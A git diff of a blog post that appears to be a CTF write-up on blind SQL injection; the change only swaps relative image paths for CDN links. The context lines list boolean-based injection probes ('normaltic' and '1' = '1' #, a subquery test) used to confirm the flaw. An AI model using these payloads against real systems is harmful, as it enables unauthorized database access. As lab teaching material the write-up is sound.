@@ -55,19 +55,19 @@ guid: https://s3mper.github.io/CTF-SQL-Injection-6/
 # Blind SQL Injection
 ## 1. START
 1. **normaltic**
-![alt text](/_image/2024-11-28-00-00-05.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-05.png?raw=true)
 1. **normaltic' #**
-![alt text](/_image/2024-11-28-00-00-06.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-06.png?raw=true)
 1. **normaltic' and '1' = '1' #**
-![alt text](/_image/2024-11-28-00-00-07.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-07.png?raw=true)
 1. **normaltic' and '1' = '2' #**
-![alt text](/_image/2024-11-28-00-00-08.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-08.png?raw=true)
 1. **normaltic' and ('1' = '1') and '1' = '1' #**
-![alt text](/_image/2024-11-28-00-00-09.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-09.png?raw=true)
 1. **normaltic' and ('1' = '1') and '1' = '2' #**
-![alt text](/_image/2024-11-28-00-00-10.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-10.png?raw=true)
 1. **normaltic' and (select 'test' = 'test') and '1' = '1' #**
-![alt text](/_image/2024-11-28-00-00-12.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-12.png?raw=true)
 
 ## 2. DATABASE
 ### 2.1. 이름 글자수 확인
